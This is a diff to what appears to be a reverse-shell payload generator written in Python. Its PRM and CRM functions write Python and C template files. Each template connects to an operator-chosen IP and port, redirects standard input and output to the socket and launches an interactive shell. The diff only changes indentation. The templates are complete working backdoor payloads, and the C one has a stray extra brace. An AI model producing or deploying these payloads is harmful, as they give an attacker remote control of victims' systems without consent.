@@ -16,18 +16,18 @@ def PRM():
 
         File = open(name,'w')
         T = '''
-    from os import environ
-    import socket,subprocess,os
-    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+from os import environ
+import socket,subprocess,os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
         '''
         T0 = "\ns.connect((%s,%s))"%(ip,port)
 
         T1 = '''
-    os.dup2(s.fileno(),0)
-    os.dup2(s.fileno(),1)
-    os.dup2(s.fileno(),2)
-    shell = environ['SHELL']
-    p=subprocess.call([shell,"-i"])
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+shell = environ['SHELL']
+p=subprocess.call([shell,"-i"])
         '''
         File.write(T)
         File.write(T0)
@@ -48,35 +48,35 @@ def CRM():
         print (Fore.RESET+"")
         
         shell = '''
-    #include <stdio.h>
-    #include <sys/socket.h>
-    #include <sys/types.h>
-    #include <stdlib.h>
-    #include <unistd.h>
-    #include <netinet/in.h>
-    #include <arpa/inet.h>
+#include <stdio.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
 
-    int main(void){
-        char* sh = getenv("SHELL");
-        
-        int port = PORT,
-            sockt = socket(AF_INET,SOCK_STREAM,0);
-        struct sockaddr_in revsockaddr;
-        revsockaddr.sin_family = AF_INET;
-        revsockaddr.sin_port = htons(port);
-        revsockaddr.sin_addr.s_addr = inet_addr(IP);
+int main(void){
+    char* sh = getenv("SHELL");
 
-        connect(sockt, (struct sockaddr *) &revsockaddr, sizeof(revsockaddr));
-        dup2(sockt, 0);
-        dup2(sockt, 1);
-        dup2(sockt, 2);
-        char *const argv[] = {sh,NULL};
+    int port = PORT,
+        sockt = socket(AF_INET,SOCK_STREAM,0);
+    struct sockaddr_in revsockaddr;
+    revsockaddr.sin_family = AF_INET;
+    revsockaddr.sin_port = htons(port);
+    revsockaddr.sin_addr.s_addr = inet_addr(IP);
 
-        execve(sh,argv,NULL);
+    connect(sockt, (struct sockaddr *) &revsockaddr, sizeof(revsockaddr));
+    dup2(sockt, 0);
+    dup2(sockt, 1);
+    dup2(sockt, 2);
+    char *const argv[] = {sh,NULL};
 
-        return 0;
-    }
-    }
+    execve(sh,argv,NULL);
+
+    return 0;
+}
+}
 
         '''
         File = open(name,'w')
